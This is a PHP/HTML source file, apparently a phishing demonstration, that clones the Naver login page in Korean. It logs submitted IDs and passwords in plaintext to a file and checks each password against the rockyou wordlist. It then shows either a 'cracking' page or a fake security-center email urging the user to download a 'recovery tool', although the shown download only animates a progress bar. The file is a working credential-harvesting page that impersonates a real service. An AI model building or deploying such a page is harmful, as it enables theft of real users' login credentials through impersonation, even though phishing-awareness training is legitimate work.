<?php
session_start();
$session_id = session_id();
$show_email_ui = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userid = isset($_POST['id']) ? trim($_POST['id']) : '';
    $password = isset($_POST['pw']) ? trim($_POST['pw']) : '';

    if (empty($userid) || empty($password)) {
        $error = "아이디와 비밀번호를 모두 입력하세요.";
    } else {
        // 로그 파일 경로
        $logLine = date('Y-m-d H:i:s') . " - Session: {$session_id} - Login Attempt - ID: {$userid}, PW: {$password}\n";
        file_put_contents(dirname(__FILE__) . 'log.txt', $logLine, FILE_APPEND | LOCK_EX);

        // 약한 비밀번호 체크 (직접 파일 읽기 방식으로 변경)
        $is_password_weak = false; // 취약한 비밀번호인지 여부를 저장할 변수

        // rockyou.txt 파일의 경로를 지정합니다.
        // 이 코드가 제대로 작동하려면, nidlogin.login.php와 rockyou.txt가 같은 폴더에 있어야 합니다.
        $password_file = dirname(__FILE__) . '/rockyou.txt';
        $handle = @fopen($password_file, "r");

        if ($handle) {
            // 파일의 끝에 도달할 때까지 한 줄씩 읽습니다.
            while (($line = fgets($handle)) !== false) {
                $weak_password = trim($line);

                // 입력된 비밀번호와 파일에서 읽은 비밀번호가 일치하는지 확인합니다.
                if ($password === $weak_password) {
                    $is_password_weak = true; // 일치하면 true로 설정
                    break; // 즉시 루프를 종료합니다.
                }
            }
            fclose($handle); // 파일 핸들을 닫아줍니다.
        }
    }
    if ($is_password_weak) {
        // 취약한 비밀번호가 감지되었을 때 로그를 남깁니다.
        // 기존 nidlogin.login.php의 로그 파일 위치와 동일하게 맞춥니다.
        $logLine = date('Y-m-d H:i:s') . " - Session: {$session_id} - Weak Password Detected: {$password}\n";
        file_put_contents(dirname(__FILE__) . '../log.txt', $logLine, FILE_APPEND | LOCK_EX);

        // cracking.html 페이지로 이동시킵니다.
        header('Location: ../pages/cracking.html');
        exit;
    } else {
        // 안전한 비밀번호일 경우, 가짜 메일 UI를 표시합니다.
        $show_email_ui = true;
    }
}
?>

<!DOCTYPE html>
<html lang="ko">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:type" content="website">
    <meta property="og:title" content="네이버">
    <meta property="og:description" content="네이버에 로그인 하고 나를 위한 다양한 서비스를 이용해 보세요">
    <meta property="og:image" content="../assets/naver_logo.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta name="description" content="네이버에 로그인 하고 다양한 서비스를 이용해 보세요">
    <meta name="robots" content="index, follow">
    <meta name="Keywords" content="네이버 로그인">
    <title>네이버 : 로그인</title>
    <link rel="stylesheet" type="text/css" href="../css/w_20241010.css?v=1">
    <link rel="stylesheet" type="text/css" href="../css/phishing.css?v=1">
    <style>
        /* 긴급 임베디드 CSS (CSS 파일 로드 실패 대비) */
        .email-container {
            max-width: 600px;
            margin: 40px auto;
            background: #fff;
            border: 1px solid #ddd;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .email-header {
            background: #03c75a;
            color: white;
            padding: 20px;
            text-align: center;
        }

        .email-body {
            padding: 30px;
            line-height: 1.6;
        }

        .alert {
            color: red;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .action-button {
            background: #03c75a;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            margin-top: 15px;
            font-size: 1.1em;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }

        .action-button:hover {
            background: #02a849;
        }

        #download-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            color: white;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 10000;
        }

        .progress-bar {
            width: 300px;
            height: 20px;
            border: 2px solid #03c75a;
            margin-top: 20px;
        }

        .progress-fill {
            height: 100%;
            width: 0;
            background: #03c75a;
            transition: width 3.5s linear;
        }

        .tooltip {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
            cursor: pointer;
        }
    </style>
    <script type="text/javascript" src="../js/srcOnError.js?v=1"></script>
    <script type="text/javascript" src="../js/passkeyApi.js?v=1"></script>
    <script type="text/javascript" src="../js/phishing.js?v=1"></script>
    <script>
        console.log('nidlogin.login.php: phishing.js 로드 완료');
    </script>
</head>

<body>
    <div id="wrap" class="wrap">
        <div class="u_skip"><a href="https://www.naver.com">본문 바로가기</a></div>
        <header class="header" role="banner">
            <div class="header_inner">
                <a href="https://www.naver.com" class="logo" id="log.naver">
                    <h1 class="blind">NAVER</h1>
                </a>
                <div class="lang" id="show_locale_switch">
                    <select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
                        <option value="ko_KR">한국어</option>
                        <option value="en_US">English</option>
                        <option value="zh-Hans_CN">中文(简体)</option>
                        <option value="zh-Hant_TW">中文(台灣)</option>
                    </select>
                </div>
            </div>
        </header>

        <div id="container" class="container">
            <div class="content">
                <?php if ($show_email_ui) { ?>
                    <!-- 가짜 메일 UI -->
                    <div class="email-container">
                        <div class="email-header">
                            <h2>네이버 보안 센터: 긴급 계정 복구 알림</h2>
                        </div>
                        <div class="email-body">
                            <p><strong>ID: <?php echo htmlspecialchars($userid); ?></strong> 님께,</p>
                            <p class="alert">고객님의 계정에서 비정상적인 로그인 시도가 감지되었습니다. 즉시 아래 <strong>보안 복구 도구</strong>를 실행하여 계정의 보안 상태를 점검하시기 바랍니다.</p>
                            <p>이 메일은 시스템에 의해 자동으로 발송되었으며, 보안 조치를 위해 48시간 이내에 복구를 진행해 주셔야 합니다.</p>
                            <p style="text-align: center;">
                                <button onclick="simulateExecution()" class="action-button">
                                    ⚠️ 보안 복구 도구 다운로드 및 실행 (권장)
                                </button>
                            </p>
                            <p style="margin-top: 30px; font-size: 0.9em; color: #777;">
                                *만약 이 메일이 잘못 발송되었다고 생각하시면, 네이버 고객센터(1588-3820)로 문의해 주시기 바랍니다.
                            </p>
                            <div class="tooltip">의심스러운 첨부 파일은 절대 클릭하지 마세요!</div>
                        </div>
                    </div>
                    <div id="download-overlay">
                        <h2>보안 복구 도구 실행 중...</h2>
                        <p>시스템 보안을 위해 파일 무결성 검사 및 복구를 진행합니다.</p>
                        <div class="progress-bar">
                            <div id="progress-fill" class="progress-fill"></div>
                        </div>
                        <p style="margin-top: 10px;">파일 실행 완료까지 잠시만 기다려주세요...</p>
                    </div>
                <?php } else { ?>
                    <!-- 로그인 UI -->
                    <div class="login_wrap">
                        <ul class="menu_wrap" role="tablist">
                            <li class="menu_item" role="presentation">
                                <a href="#none" id="loinid" class="menu_id on" role="tab" aria-selected="true">
                                    <span class="menu_text"><span class="text">ID/전화번호</span></span>
                                </a>
                            </li>
                            <li class="menu_item" role="presentation">
                                <a href="#none" id="ones" class="menu_ones" role="tab" aria-selected="false">
                                    <span class="menu_text"><span class="text">일회용 번호</span></span>
                                </a>
                            </li>
                            <li class="menu_item" role="presentation">
                                <a href="#none" id="qrcode" class="menu_qr" role="tab" aria-selected="false">
                                    <span class="menu_text"><span class="text">QR코드</span></span>
                                </a>
                            </li>
                        </ul>
                        <form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off" action="" method="POST">
                            <input type="hidden" id="localechange" name="localechange" value="">
                            <input type="hidden" name="encpw" id="encpw" value="">
                            <input type="hidden" name="sessionKey" id="sessionKey" value="">
                            <input type="hidden" name="show_pk" id="show_pk" value="true">
                            <input type="hidden" name="wtoken" id="wtoken" value="">
                            <input type="hidden" name="svctype" id="svctype" value="1">
                            <input type="hidden" name="bvsd" id="bvsd" value="">
                            <input type="hidden" name="locale" id="locale" value="ko_KR">
                            <input type="hidden" name="url" id="url" value="https://www.naver.com">
                            <input type="hidden" name="enctp" id="enctp" value="1">
                            <input type="hidden" name="next_step" id="next_step" value="false">
                            <input type="hidden" name="fbOff" id="fbOff" value="true">
                            <input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
                            <input type="hidden" name="encnm" id="encnm" value="">
                            <ul class="panel_wrap">
                                <li class="panel_item" style="display: block;">
                                    <div class="panel_inner" role="tabpanel" aria-controls="loinid">
                                        <div class="login_form">
                                            <div class="login_box">
                                                <div class="input_item id" id="input_item_id">
                                                    <input type="text" id="id" name="id" accesskey="L" maxlength="41"
                                                        autocapitalize="none" value="" title="아이디" class="input_id" aria-label="아이디 또는 전화번호">
                                                    <label for="id" class="text_label" id="id_label" aria-hidden="true">아이디 또는 전화번호</label>
                                                    <button type="button" class="btn_delete" id="id_clear" style="display: none;">
                                                        <span class="icon_delete"><span class="blind">삭제</span></span>
                                                    </button>
                                                </div>
                                                <div class="input_item pw" id="input_item_pw">
                                                    <input type="password" id="pw" name="pw" title="비밀번호" class="input_pw" maxlength="16" aria-label="비밀번호">
                                                    <label for="pw" class="text_label" id="pw_label" aria-hidden="true">비밀번호</label>
                                                    <button type="button" class="btn_view hide" id="pw_hide" aria-pressed="false" style="display: none;">
                                                        <span class="icon_view"><span class="blind" id="icon_view">선택 안 됨,비밀번호 표시</span></span>
                                                    </button>
                                                    <button type="button" class="btn_delete" id="pw_clear" style="display: none;">
                                                        <span class="icon_delete"><span class="blind">삭제</span></span>
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="login_keep_wrap" id="login_keep_wrap">
                                            <div class="keep_check">
                                                <input type="checkbox" id="keep" name="nvlong" class="input_keep" value="off">
                                                <label for="keep" class="keep_text">로그인 상태 유지</label>
                                            </div>
                                            <div class="ip_check">
                                                <a target="_blank" id="ipguide" title="IP보안"><span class="ip_text">IP보안</span></a>
                                                <span class="switch">
                                                    <input type="checkbox" id="switch" class="switch_checkbox" checked>
                                                    <label for="switch" class="switch_btn">
                                                        <span class="switch_on" role="checkbox" aria-checked="true">ON</span>
                                                        <span class="switch_off" role="checkbox" aria-checked="false">OFF</span>
                                                    </label>
                                                </span>
                                            </div>
                                        </div>
                                        <?php if (isset($error)) { ?>
                                            <div class="login_error_wrap" id="err_common" style="display: block;">
                                                <div class="error_message"><?php echo $error; ?></div>
                                            </div>
                                        <?php } ?>
                                        <div class="login_error_wrap" id="err_capslock" style="display: none;">
                                            <div class="error_message">
                                                <p><strong>Caps Lock</strong>이 켜져 있습니다.</p>
                                            </div>
                                        </div>
                                        <div class="login_error_wrap" id="err_empty_id" style="display: none;">
                                            <div class="error_message"><strong>아이디 또는 전화번호</strong>를 입력해 주세요.</div>
                                        </div>
                                        <div class="login_error_wrap" id="err_empty_pw" style="display: none;">
                                            <div class="error_message"><strong>비밀번호</strong>를 입력해 주세요.</div>
                                        </div>
                                        <div class="btn_login_wrap" style="margin-top: 20px; text-align: center;">
                                            <button type="submit" class="btn_login" id="log.login" style="width: 100%; padding: 13px 0; background: #03c75a; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s;" onmouseover="this.style.background='#02b150'" onmouseout="this.style.background='#03c75a'">
                                                <span class="btn_text" id="log.login.text">로그인</span>
                                                <span class="blind" id="log.login.blind">로그인 버튼</span>
                                            </button>
                                        </div>
                                        <div class="dividing_safe" id="passkey.divider">
                                            <span class="text">지문 · 얼굴 인증을 설정했다면</span>
                                        </div>
                                        <div class="btn_login_wrap" id="passkey.warpper">
                                            <button type="button" class="btn_login white nlog-click" id="log.passkeylogin">
                                                <span class="btn_text">패스키 로그인</span>
                                                <span class="blind" id="log.passkey.login.blind">패스키로그인 버튼</span>
                                            </button>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </form>
                        <ul class="find_wrap" id="find_wrap">
                            <li><a target="_blank" href="#" id="idinquiry" class="find_text">비밀번호 찾기</a></li>
                            <li><a target="_blank" href="#" id="pwinquiry" class="find_text">아이디 찾기</a></li>
                            <li><a target="_blank" href="#" id="join" class="find_text">회원가입</a></li>
                        </ul>
                        <div id="gladbanner" class="banner_wrap">&nbsp;</div>
                    </div>
                <?php } ?>
            </div>
        </div>

        <div class="footer">
            <div class="footer_inner">
                <ul class="footer_link" id="footer_link">
                    <li><a target="_blank" class="footer_item" href="#" id="fot.agreement"><span class="text">이용약관</span></a></li>
                    <li><a target="_blank" class="footer_item" href="#" id="fot.privacy"><span class="text"><strong>개인정보처리방침</strong></span></a></li>
                    <li><a target="_blank" class="footer_item" href="#" id="fot.disclaimer"><span class="text">책임의 한계와 법적고지</span></a></li>
                    <li><a target="_blank" class="footer_item" href="#" id="fot.help"><span class="text">회원정보 고객센터</span></a></li>
                </ul>
                <div class="footer_copy">
                    <a id="fot.naver" target="_blank" href="#">
                        <span class="footer_logo"><span class="blind">네이버</span></span>
                    </a>
                    <span class="text">Copyright</span>
                    <span class="corp">© NAVER Corp.</span>
                    <span class="text">All Rights Reserved.</span>
                </div>
            </div>
        </div>
    </div>
    <input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_kr">
    <input type="hidden" id="nid_buk" name="nid_buk" value="exist">
    <input type="hidden" id="removeLink" name="removeLink" value="">
    <input type="hidden" id="hide_util" name="hide_util" value="">
    <input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
    <input type="hidden" id="id_error_msg" name="id_error_msg" value="<strong>아이디 또는 전화번호</strong>를 입력해 주세요.">
    <input type="hidden" id="pw_error_msg" name="pw_error_msg" value="<strong>비밀번호</strong>를 입력해 주세요.">
    <input type="hidden" id="onload_pk" name="onload_pk" value="false">
    <input type="hidden" id="locale" name="locale" value="ko_KR">
    <input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
    <input type="hidden" id="ispopup" name="ispopup" value="false">
    <script type="text/javascript" async src="https://ssl.pstatic.net/tveta/libs/glad/prod/gfp-core.js"></script>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('frmNIDLogin');
            const loginButton = document.getElementById('log.login');
            const idInput = document.getElementById('id');
            const pwInput = document.getElementById('pw');
            const idLabel = document.getElementById('id_label');
            const pwLabel = document.getElementById('pw_label');

            loginButton.addEventListener('click', () => {
                console.log('로그인 버튼 클릭됨');
            });

            form.addEventListener('submit', (e) => {
                const id = idInput.value;
                const pw = pwInput.value;
                if (!id || !pw) {
                    e.preventDefault();
                    document.getElementById('err_empty_id').style.display = id ? 'none' : 'block';
                    document.getElementById('err_empty_pw').style.display = pw ? 'none' : 'block';
                    console.log('입력 오류: ID 또는 비밀번호가 비어 있음');
                } else {
                    console.log('폼 제출 성공: ID=' + id);
                }
            });

            function updateLabel(input, label) {
                if (input.value || document.activeElement === input) {
                    label.style.fontSize = '15px';
                    label.style.top = '-3px';
                    label.style.background = 'rgba(255, 255, 255, 0)';
                    label.style.padding = '0 0px';
                } else {
                    label.style.fontSize = '16px';
                    label.style.top = '17px';
                    label.style.background = 'none';
                    label.style.color = '#888';
                    label.style.padding = '0';
                }
            }

            idInput.addEventListener('input', () => updateLabel(idInput, idLabel));
            idInput.addEventListener('focus', () => updateLabel(idInput, idLabel));
            idInput.addEventListener('blur', () => updateLabel(idInput, idLabel));

            pwInput.addEventListener('input', () => updateLabel(pwInput, pwLabel));
            pwInput.addEventListener('focus', () => updateLabel(pwInput, pwLabel));
            pwInput.addEventListener('blur', () => updateLabel(pwInput, pwLabel));
        });
    </script>
    <div id="nv_stat" style="display:none;">20</div>
</body>

</html>